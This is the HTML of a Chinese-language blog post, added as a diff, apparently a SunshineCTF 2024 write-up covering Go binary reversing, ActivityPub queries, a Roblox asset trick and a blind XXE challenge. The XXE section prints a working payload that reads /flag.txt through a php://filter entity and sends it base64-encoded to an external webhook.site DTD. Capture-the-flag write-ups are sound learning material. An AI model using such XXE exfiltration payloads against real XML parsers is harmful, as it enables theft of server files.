@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allRank: 10Team: WAN一年了，真快…遙想去年這時候我還在跟初次組隊的隊友 @cakeisthefake_naup 和 @cakeisthefake_aukro 半夜兩點研究怎麼拆100分題的git bundle … 這一年來真的進步很多，從這場對於我們意義重大的比賽可見一斑：從76名殺到前十欸！   該怎麼說呢，打CTF積累的歡樂感好像在這兩天傾巢而出，雖然Web狗">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SunshineCTF 2024 Write Up">
+<meta property="og:url" content="http://wha13.github.io/2024/10/22/sunshinectf-2024/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allRank: 10Team: WAN一年了，真快…遙想去年這時候我還在跟初次組隊的隊友 @cakeisthefake_naup 和 @cakeisthefake_aukro 半夜兩點研究怎麼拆100分題的git bundle … 這一年來真的進步很多，從這場對於我們意義重大的比賽可見一斑：從76名殺到前十欸！   該怎麼說呢，打CTF積累的歡樂感好像在這兩天傾巢而出，雖然Web狗">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1p3aeHeyg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkCYNdfl1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy2cV_Mlyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By7AN_zx1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ9dr_MeJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJRaUufx1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkMQvdfl1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJKIP_Gxye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByfFD_Gxye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hyhiw_Gxke.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HynMOdzxkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJ519lreJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByZHKlrg1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rysGclHg1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk3JOxrgyl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1JYmlSe1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1nq7xSgyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1vOEgHxkx.png">
+<meta property="article:published_time" content="2024-10-22T10:18:30.000Z">
+<meta property="article:modified_time" content="2024-10-22T14:58:14.377Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WAN">
+<meta property="article:tag" content="SunShine CTF">
+<meta property="article:tag" content="GoLang">
+<meta property="article:tag" content="Activitypub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/S1p3aeHeyg.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SunshineCTF 2024 Write Up</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/04/2024-cggc/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/10/16/ethernaut-wp-first/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/10/22/sunshinectf-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&text=SunshineCTF 2024 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&is_video=false&description=SunshineCTF 2024 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SunshineCTF 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/10/22/sunshinectf-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&name=SunshineCTF 2024 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/10/22/sunshinectf-2024/&t=SunshineCTF 2024 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dungeon-Keymaster"><span class="toc-number">2.</span> <span class="toc-text">Dungeon Keymaster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BotNet-1"><span class="toc-number">3.</span> <span class="toc-text">BotNet 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BotNet-2"><span class="toc-number">4.</span> <span class="toc-text">BotNet 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puzzling"><span class="toc-number">5.</span> <span class="toc-text">Puzzling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rogue-robloxians"><span class="toc-number">6.</span> <span class="toc-text">rogue robloxians</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SunshineCTF 2024 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-22T10:18:30.000Z" class="dt-published" itemprop="datePublished">2024-10-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Activitypub/" rel="tag">Activitypub</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/GoLang/" rel="tag">GoLang</a>, <a class="p-category" href="/tags/SunShine-CTF/" rel="tag">SunShine CTF</a>, <a class="p-category" href="/tags/WAN/" rel="tag">WAN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Rank: 10<br>Team: WAN<br>一年了，真快…<br>遙想去年這時候我還在跟初次組隊的隊友 @cakeisthefake_naup 和 @cakeisthefake_aukro 半夜兩點研究怎麼拆100分題的git bundle … 這一年來真的進步很多，從這場對於我們意義重大的比賽可見一斑：從76名殺到前十欸！  </p>
+<p>該怎麼說呢，打CTF積累的歡樂感好像在這兩天傾巢而出，<del>雖然Web狗沒什麼人權所以我跑去逆golang web</del>，未來也有很長很長要走，繼續開心的學吧ｗ  </p>
+<p>再一次深深感謝兩位隊友和其他這一年的同儕ㄌ，這一年沒有你們一起共學、吐槽／抒發各種事情和打鬧我想我可能也沒辦法走的那麼開心。而時不時被我諮詢的前輩大大們也是我學習的一大助力，不然好多東西和學習方向其實我本來也亂亂的，大感謝!!!  </p>
+<p>P.S. 看自己一年前寫的Write Up和心得感到&gt;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&lt;是正常的ㄇ XD  </p>
+<p><img src="https://hackmd.io/_uploads/S1p3aeHeyg.png" alt="image">  </p>
+<p><em>這份wp只會挑重點的題目寫，其他我在95號公路speed run pwn題的紀錄和Crypto通靈紀就先算了XD</em>  </p>
+<h2 id="Dungeon-Keymaster"><a href="#Dungeon-Keymaster" class="headerlink" title="Dungeon Keymaster"></a>Dungeon Keymaster</h2><p><del>結果打開是一個Web</del><br><img src="https://hackmd.io/_uploads/HkCYNdfl1l.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/Sy2cV_Mlyx.png" alt="image">  </p>
+<p>檢視原始碼，找到Amazon s3 bucket，連進去就看到app檔案了<br><img src="https://hackmd.io/_uploads/By7AN_zx1x.png" alt="image"><br>丟IDA看看：<br>重點觀察Main裡面的函數<br><img src="https://hackmd.io/_uploads/rJ9dr_MeJg.png" alt="image">  </p>
+<p><strong>main.checkKey</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.checkKey</span></span><br><span class="line">_BOOL8 __golang <span class="title function_">main_checkKey</span><span class="params">(</span></span><br><span class="line"><span class="params">        __int64 a1,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 a2,</span></span><br><span class="line"><span class="params">        __int64 a3,</span></span><br><span class="line"><span class="params">        __int64 a4,</span></span><br><span class="line"><span class="params">        __int64 a5,</span></span><br><span class="line"><span class="params">        __int64 a6,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a7,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a8,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v9; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">40</span>]; <span class="comment">// [rsp+58h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+80h] [rbp+0h] BYREF</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+88h] [rbp+8h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+88h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)&amp;retaddr &lt;= *(_QWORD *)(v9 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = a1;</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">    a1 = v16;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = a1;</span><br><span class="line">  strings_genSplit(a1, a2, (__int64)&amp;unk_7AC959, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">-1LL</span>, a7, a8, a9);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v10 = off_A82830;</span><br><span class="line">  v11 = runtime_concatstring5(</span><br><span class="line">          (__int64)v13,</span><br><span class="line">          (__int64)off_A82830,</span><br><span class="line">          qword_A82838,</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_7AC959,</span><br><span class="line">          <span class="number">1LL</span>,</span><br><span class="line">          (__int64)off_A82840,</span><br><span class="line">          qword_A82848,</span><br><span class="line">          (__int64)&amp;unk_7AC959,</span><br><span class="line">          <span class="number">1LL</span>,</span><br><span class="line">          (__int64)off_A82850,</span><br><span class="line">          qword_A82858);</span><br><span class="line">  <span class="keyword">return</span> v10 == &amp;unk_3 &amp;&amp; (<span class="type">unsigned</span> __int8)runtime_memequal(v15, v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>抓一抓資料，unk_7AC959是一個<code>-</code>的字元，然後strings.genSplit在GoLang就是split…，同理對於runtime_concatstring5<br>判斷一下邏輯就會發現要讓使用者提供的v15&#x3D;&#x3D;v11，撈資料！  </p>
+<p>這邊要稍微注意一點，off_A82830和off_A82850上面的資料都是串在一起的：  </p>
+<p><img src="https://hackmd.io/_uploads/SJRaUufx1l.png" alt="image"></p>
+<p>所以再從函數的參數推論一些事情：<br><img src="https://hackmd.io/_uploads/SkMQvdfl1e.png" alt="image">  </p>
+<p>往data段找那些中間的參數，都是數字，可以合理推斷是字串長度。  </p>
+<p>最後輸入組合起來的密碼(<code>/dungeon-8734-http://localhost:8734</code>)，會被提示可以到<code>/dungeon</code>找flag<br><img src="https://hackmd.io/_uploads/BJKIP_Gxye.png" alt="image">  </p>
+<p>分析<strong>main.handleDungeon</strong><br>直接進到網站會變這樣：<br><img src="https://hackmd.io/_uploads/ByfFD_Gxye.png" alt="image">  </p>
+<p>注意這段程式碼<br><img src="https://hackmd.io/_uploads/Hyhiw_Gxke.png" alt="image"></p>
+<p>net_url__ptr_URL_Query 就是用來 parse GET Query 的，而v42本來是個很長的字串，但被set了一個len&#x3D;3，也就是前三位的key<br>最後只需要造訪  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://keymaster.2024.sunshinectf.games/dungeon?key=/dungeon-8734-http://localhost:8734</span><br></pre></td></tr></table></figure>
+<p>即可拿到flag!<br><img src="https://hackmd.io/_uploads/HynMOdzxkx.png" alt="image">  </p>
+<h2 id="BotNet-1"><a href="#BotNet-1" class="headerlink" title="BotNet 1"></a>BotNet 1</h2><p>Activitypub正是這幾年興起的聯邦式網路，而這題就是一個Activitypub架構的服務<br>SPEC:<a target="_blank" rel="noopener" href="https://www.w3.org/TR/activitypub/">https://www.w3.org/TR/activitypub/</a><br>有兩個users rin和miku，爆破看看還有哪些user找到actor<br><img src="https://hackmd.io/_uploads/HJ519lreJg.png" alt="image"><br>進去就是服務資訊，知道flag在miku和rin那邊，<del>接著就是痛苦的spec reading time</del>  </p>
+<p>翻一翻就看到這段了，要開Accept才收的到啊…<br><img src="https://hackmd.io/_uploads/ByZHKlrg1g.png" alt="image">  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://botnet.2024.sunshinectf.games/users/rin --header <span class="string">&quot;Accept: application/activity+json&quot;</span> --insecure</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rysGclHg1e.png" alt="image"><br><del>然後根本沒有Oauth</del>  </p>
+<h2 id="BotNet-2"><a href="#BotNet-2" class="headerlink" title="BotNet 2"></a>BotNet 2</h2><p><strong>賽後解</strong><br>那時候準備微積分小考就沒打ㄌ，本場小失分（就差這題破台web）<br>用第一題作法會說訊息沒簽章，可以自己用官方的activitypub sign簽一個過去，但最快的方法是用browser.pub看<a target="_blank" rel="noopener" href="https://botnet.2024.sunshinectf.games/users/miku">https://botnet.2024.sunshinectf.games/users/miku</a>  </p>
+<p><img src="https://hackmd.io/_uploads/rk3JOxrgyl.png" alt="image"></p>
+<h2 id="Puzzling"><a href="#Puzzling" class="headerlink" title="Puzzling"></a>Puzzling</h2><p>一個sodoku網站，能用xml格式傳題目上去，但是想XXE會吃400，要Blond XXE<br>我是用引入外部 dtd + php filter 的經典招去讀檔，payload如下：<br>webhook內容：  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;https://webhook.site/8a3afb37-f34e-49ed-8a1c-a6138c7fe319/?content=%file;%27%3E &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>送出的：  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">load</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://webhook.site/8a3afb37-f34e-49ed-8a1c-a6138c7fe319/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%load;</span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>webhook get flag XD  </p>
+<h2 id="rogue-robloxians"><a href="#rogue-robloxians" class="headerlink" title="rogue robloxians"></a>rogue robloxians</h2><p>那到一個Roblox遊戲連結 <a target="_blank" rel="noopener" href="https://www.roblox.com/games/102169837739752/Flag-Generator">https://www.roblox.com/games/102169837739752/Flag-Generator</a><br>載下來發現一個generateFlag<br><img src="https://hackmd.io/_uploads/S1JYmlSe1g.png" alt="image">  </p>
+<p>點開來發現這個  </p>
+<p><img src="https://hackmd.io/_uploads/H1nq7xSgyx.png" alt="image">  </p>
+<p>應該是要調整版本，去google找到這個：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=a3qFCngoSLk">https://www.youtube.com/watch?v=a3qFCngoSLk</a>  </p>
+<p>payload:<br><code>https://assetdelivery.roblox.com/v1/asset/?id=102169837739752&amp;version=2</code><br>載下來直接string就拿到flag了<br><img src="https://hackmd.io/_uploads/S1vOEgHxkx.png" alt="image">  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dungeon-Keymaster"><span class="toc-number">2.</span> <span class="toc-text">Dungeon Keymaster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BotNet-1"><span class="toc-number">3.</span> <span class="toc-text">BotNet 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BotNet-2"><span class="toc-number">4.</span> <span class="toc-text">BotNet 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puzzling"><span class="toc-number">5.</span> <span class="toc-text">Puzzling</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rogue-robloxians"><span class="toc-number">6.</span> <span class="toc-text">rogue robloxians</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/10/22/sunshinectf-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&text=SunshineCTF 2024 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&is_video=false&description=SunshineCTF 2024 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SunshineCTF 2024 Write Up&body=Check out this article: http://wha13.github.io/2024/10/22/sunshinectf-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&title=SunshineCTF 2024 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/10/22/sunshinectf-2024/&name=SunshineCTF 2024 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/10/22/sunshinectf-2024/&t=SunshineCTF 2024 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
